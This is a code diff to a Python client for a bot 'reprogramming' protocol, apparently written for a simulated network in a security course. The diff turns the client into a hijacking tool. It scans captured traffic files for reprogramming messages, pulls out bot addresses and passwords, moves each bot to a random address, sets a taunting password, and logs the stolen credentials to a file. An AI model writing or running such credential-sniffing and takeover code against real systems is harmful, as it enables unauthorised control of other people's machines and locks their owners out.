@@ -20,6 +20,9 @@ from playground.utils.ui import CLIShell, stdio
 from playground import playgroundlog
 
 import sys, os, traceback, getpass
+from os import listdir as listdir
+from time import time
+from random import SystemRandom as sr
 try:
     import ProtocolStack
 except:
@@ -39,11 +42,11 @@ class ReprogrammingClientProtocol(Protocol):
         
     def dataReceived(self, data):
         self.__storage.update(data)
-        print "received", len(data), "bytes from", self.transport.getPeer()
+        print("\nReceived from %s ->" % self.transport.getPeer())
         for message in self.__storage.iterateMessages():
             if not self.__requests.has_key(message.RequestId):
                 continue
-            print "getting callback for requestId", message.RequestId
+            #print "getting callback for requestId", message.RequestId
             d = self.__requests[message.RequestId]
             d.callback(message.Data)
         
@@ -83,7 +86,7 @@ class ReprogrammingClientProtocol(Protocol):
     
     
 class ReprogrammingShellProtocol(CLIShell):
-    PROMPT = "[NOT CONNECTED] >>"
+    PROMPT = "<Reprogramming Shell>"
     
     RAW_PORT = 666
     ADV_PORT = 667
@@ -93,21 +96,40 @@ class ReprogrammingShellProtocol(CLIShell):
         self.__botAddress = botAddress
         self.__connectPort = self.RAW_PORT
         self.protocol = None
-        self.password = "222222"
+        self.password = "123456"
+        self.toPassword = "NotSetYet"
         
     def connectionMade(self):
         self.connectToBot(self.__connectPort)
         self.__loadCommands()
         
     def __botConnectionMade(self, protocol):
-        self.transport.write("Connected to Bot.\n")
+        self.transport.write("Connected to Bot at %s\n" % self.__botAddress)
         self.protocol = protocol
         self.prompt = "[%s::%d] >>" % (self.__botAddress, self.__connectPort)
-        self.reprogram(None, "ADDRESS", "0.0.0.1")
+        
+        # Check if this is a stolen bot
+        if ".66432.13056." not in self.__botAddress:
+            randaddress = "%s.66432.13056.%s" % ( sr().getrandbits(22), sr().getrandbits(22))
+            randpw = "~EthnicClensiStanWazHere~UrBotWazBelongToUs@%s~Thanks~%s" % (time(),sr().getrandbits(256))
+            self.reprogram(None, "ADDRESS", randaddress)
+            
+            # Save stolen bot info to new file
+            with open("stolenBots.py.data", "a") as f:
+                f.write("--origAddr=%s --origPass=%s --destAddr=%s --newPass=%s --timestamp=%s\n" % (self.__botAddress,self.password,randaddress,randpw,time()))
+                f.flush()
+            
+            # Connect to moved bot and change password
+            bprotocol = ReprogrammingShellProtocol(randaddress)
+            bprotocol.password = self.password
+            bprotocol.toPassword = randpw
+            stdio.StandardIO(bprotocol)
+        else: # This is a stolen bot
+            self.reprogram(None, "PASSWORD", self.toPassword)
         
     def reprogram(self, writer, *args):
-        print("Reprogram Called wiht %s and %s" % (args[0],args[1]))
-        print("Address: %s \tPassword: %s" % (self.__botAddress,self.password))
+        print("\tPassword: %s" % (self.password))
+        print("Reprogram %s to %s" % (args[0],args[1]))
         if not self.protocol:
             writer("Not yet connected. Cannot reprogram\n")
             return 
@@ -177,103 +199,66 @@ class ReprogrammingShellProtocol(CLIShell):
         networkSettings.configureNetworkStack(port == self.ADV_PORT and ProtocolStack or None)
         playgroundEndpoint = GateClientEndpoint(reactor, self.__botAddress, port, networkSettings)
         
-        self.transport.write("Got Endpoint\n")
+        #self.transport.write("Got Endpoint\n")
         reprogrammingProtocol = ReprogrammingClientProtocol()
-        self.transport.write("Got protocol. Trying to connect\n")
+        #self.transport.write("Got protocol. Trying to connect\n")
         d = connectProtocol(playgroundEndpoint, reprogrammingProtocol)
-        self.transport.write("Setting callback\n")
+        #self.transport.write("Setting callback\n")
         d.addCallback(self.__botConnectionMade)
         d.addErrback(self.handleError)
-        self.transport.write("Waiting for callback\n")
+        #self.transport.write("Waiting for callback\n")
     
     
     def handleResponse(self, data):
-        self.transport.write("Received response from server.\n")
+        #self.transport.write("Received response from server.\n")
         for serverString in data:
-            self.transport.write("\t%s\n" % serverString)
+            if "uccessful" in serverString:
+                self.transport.write("\t%s\n" % serverString)
+                #self.protocol.transport.loseConnection()
+            else:
+                print("Got weird response back...")
         self.refreshInterface()
             
     def handleError(self, failure):
         self.transport.write("Something went wrong: %s\n" % failure)
         self.refreshInterface()
         # swallow error
-    
-'''
-if __name__=="__main__":
-    address = sys.argv[1]
-    playgroundlog.Config.enableLogging()
-    playgroundlog.Config.enableHandler(playgroundlog.Config.STDERR_HANDLER)
-    stdio.StandardIO(ReprogrammingShellProtocol(address))    
+
+
+
+if __name__ == "__main__":
+    cont01 = []
+
+    #TODO serialize everything
+    for fname in listdir('.'):
+        if ".py" not in fname:
+            with open(fname, 'r') as f:
+                 cont01.append(f.read())
+
+    print(len(cont01))
+    cont02 = []
+    for cont01entry in cont01:
+        cont02+=cont01entry.split("\n<&#MD]\n")
+    cont03 = [entry for entry in cont02 if "\x00\x03\x00\x00\x04\x00\x01\x04\x00\x05\x00\x01\x00\x00\x00" in entry]
+    print ("Num reprogram PASSWORD msgs found: %s" % len(cont03))
+
+    cont04 = [x.split("\x00\x03\x00\x00\x04\x00\x01\x04\x00\x05\x00\x01\x00\x00\x00") for x in cont03]
+
+    #Get the passwords
+    passwords = [x[1].split("\x00\x06")[0][1:] for x in cont04]
+
+    #Get the addresses
+    cont06 = [x[0].split("-> ")[1].split(" [&#MD>")[0] for x in cont04]
+    addresses = [x.split(":")[0] for x in cont06]
+    ports = [x.split(":")[1] for x in cont06]
+
+    print(zip(addresses,passwords))
+
+    #TODO change address and then change password
+    from bot.common.network.ReprogrammingRequest import *
+    for addr,pswd in zip(addresses,passwords):
+        protocol = ReprogrammingShellProtocol(addr)
+        protocol.password = pswd
+        stdio.StandardIO(protocol)
+
     reactor.run()
-'''
-'''
-for every file in hp directory:
-	read it
-	split it by "\n<&#MD]\n" into messages
-	select messages that contain "\x00\x03\x00\x00\x04\x00\x01\x04\x00\x05\x00\x01\x00\x00\x00"
-	for each message:
-	    extract destination Address between "-> " and ":666 [&#MD>\n"
-	    extract prepassword between \x00\x03\x00\x00\x04\x00\x01\x04\x00\x05\x00\x01\x00\x00\x00" and "\x00\x06"
-	    trim first character off of prepassword to get the password
-	    
-	
-'''
-from os import listdir as listdir
-cont01 = []
-
-#TODO serialize everything
-for fname in listdir('.'):
-    if ".py" not in fname:
-        with open(fname, 'r') as f:
-             cont01.append(f.read())
-
-print(len(cont01))
-cont02 = []
-for cont01entry in cont01:
-    cont02+=cont01entry.split("\n<&#MD]\n")
-cont03 = [entry for entry in cont02 if "\x00\x03\x00\x00\x04\x00\x01\x04\x00\x05\x00\x01\x00\x00\x00" in entry]
-print ("Num reprogram PASSWORD msgs found: %s" % len(cont03))
-
-cont04 = [x.split("\x00\x03\x00\x00\x04\x00\x01\x04\x00\x05\x00\x01\x00\x00\x00") for x in cont03]
-
-#Get the passwords
-passwords = [x[1].split("\x00\x06")[0][1:] for x in cont04]
-
-#Get the addresses
-cont06 = [x[0].split("-> ")[1].split(" [&#MD>")[0] for x in cont04]
-addresses = [x.split(":")[0] for x in cont06]
-ports = [x.split(":")[1] for x in cont06]
-
-print(addresses)
-print(passwords)
-
-#TODO change address and then change password
-from bot.common.network.ReprogrammingRequest import *
-for addr,pswd in zip(addresses,passwords):
-    protocol = ReprogrammingShellProtocol(addr)
-    protocol.password = pswd
-    stdio.StandardIO(protocol)
-
-reactor.run()
-
-'''
-for each address, password:
-	    create a new random address in the range *.4918.73139.*
-	    reprogram ADDRESS to the random address
-	    generate new random password with pattern "Ethnicclensistan Waz Here At [insert Unix timestamp] Thanks for the free bot [insert random num]"
-	    reprogram PASSWORD to the random password
-	    store address and password to capturedBots.txt
-'''
-
-'''
-from bot.common.network.ReprogrammingRequest import *
-ReprogrammingRequest_v1_0()
-from twisted.internet import reactor
-from bot.client.ReprogrammingClientProtocol import *
-from playground.utils.ui import stdio
-address = "0.0.0.1"
-protocol = ReprogrammingShellProtocol(address)
-protocol.password = "merpmerp"
-stdio.StandardIO(ReprogrammingShellProtocol(address)) 
-reactor.run()
-'''
